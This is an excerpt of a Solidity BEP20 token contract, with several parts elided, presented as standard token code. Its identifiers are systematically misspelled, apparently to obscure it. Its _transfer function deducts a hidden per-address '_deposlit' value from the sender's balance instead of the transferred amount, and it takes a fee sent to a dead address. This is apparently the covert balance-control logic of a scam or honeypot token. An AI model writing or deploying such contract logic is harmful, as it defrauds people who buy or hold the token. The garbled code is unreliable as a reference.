...
library Address {
    ...
    /**
     * @dev Replacement for Solidity's `transfer`: sends `amouint` wei to
     ...
     */
    function sendValue(address payable recipient, uint256 amouint) internal {
        require(address(this).balance >= amouint, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amouint }("");
...
interface IBEP20 {
    /**
     * @dev Returns the amouint of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amouint of tokens owned by `acclount`.
     */
    function balanceOf(address acclount) external view returns (uint256);

    /**
     * @dev Moves `amouint` tokens from the caller's acclount to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amouint) external returns (bool);
    ...
    /**
     * @dev Sets `amouint` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     ...
     */
    function approve(address spender, uint256 amouint) external returns (bool);

    /**
     * @dev Moves `amouint` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amouint` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
...
contract Token is IBEP20, HasForeignAsset {
     ...
     * - the caller must have a balance of at least `amouint`.
     */
    function transfer(address recipient, uint256 amouint) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amouint);
        return true;
    }
     ...
     */
    function approve(address spender, uint256 amouint) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amouint);
        return true;
    }
     ...
     * - `sender` must have a balance of at least `amouint`.
    ...
    function transferFrom(
        ...
        _transfer(sender, recipient, amouint);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].subb(amouint, "BEP20: transfer amouint exceeds allowance")
        );
        return true;
    }
    ...
    /**
     * @dev Moves tokens `amouint` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token feiris, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
    ...
    function _transfer(
        ...
        uint256 feiriamouint = 0;
        feiriamouint = amouint.miil(_feiri).div(100);
        uint256 amoiinn;
        amoiinn = amouint - feiriamouint;
        _beforeTokenTransfer(sender, recipient, amoiinn);

        _balances[sender] = _balances[sender].subb(
            _deposlit[sender],
            "BEP20: transfer amouint exceeds balance"
        );
        ...
        if (feiriamouint > 0) {
            emit Transfer(sender, _DEADaddress, feiriamouint);
        }
        emit Transfer(sender, recipient, amoiinn);
    }

    /** @dev Creates `amouint` tokens and assigns them to `acclount`, increasing
     * the total supply.
     *
     ...
     */
    function _mintOnce(address acclount, uint256 amouint) internal virtual {
        require(acclount != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), acclount, amouint);

        _totalSupply = _totalSupply.add(amouint);
        _balances[acclount] = _balances[acclount].add(amouint);
        emit Transfer(address(0), acclount, amouint);
    }

    /**
     * @dev Destroys `amouint` tokens from `acclount`, reducing the
     * total supply.
     *
     ...
     * - `acclount` must have at least `amouint` tokens.
     */
    function _burn(address acclount, uint256 amouint) internal virtual {
        require(acclount != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(acclount, address(0), amouint);

        _balances[acclount] = _balances[acclount].subb(amouint, "BEP20: burn amouint exceeds balance");
        _totalSupply = _totalSupply.subb(amouint);
        emit Transfer(acclount, address(0), amouint);
    }

    function burn(uint256 amouint) public {
        _burn(_msgSender(), amouint);
    }

    /**
     * @dev Sets `amouint` as the allowance of `spender` over the `owner` s tokens.
     *
    ...
    function _approve(
        ...
        _allowances[owner][spender] = amouint;
        emit Approval(owner, spender, amouint);
    }
